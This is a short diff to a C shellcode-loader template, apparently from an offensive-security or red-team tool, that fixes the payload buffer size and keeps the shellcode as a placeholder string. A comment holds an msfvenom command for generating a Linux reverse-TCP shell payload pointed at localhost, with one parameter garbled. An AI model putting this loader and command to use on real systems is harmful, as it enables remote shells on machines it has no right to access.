@@ -10,12 +10,13 @@ Reference:
 */
 #include <unistd.h>
 #include <sys/mman.h>
+#include <stdint.h>
 
-#define SCSSIZE __SIZE__
+#define SCSSIZE 1024
 
 // handcrafted payload here
 // msfvenom -p linux/x86/shell/reverse_tcp LHOST=4444 LHOST=127.0.0.1 -f c
-unsigned char PAYLOAD[SCSSIZE] = __SHELLCODE__;
+unsigned char PAYLOAD[SCSSIZE] = "__SHELLCODE__";
 
 // msf template below
 //unsigned char PAYLOAD[SCSSIZE] = "PAYLOAD: ";
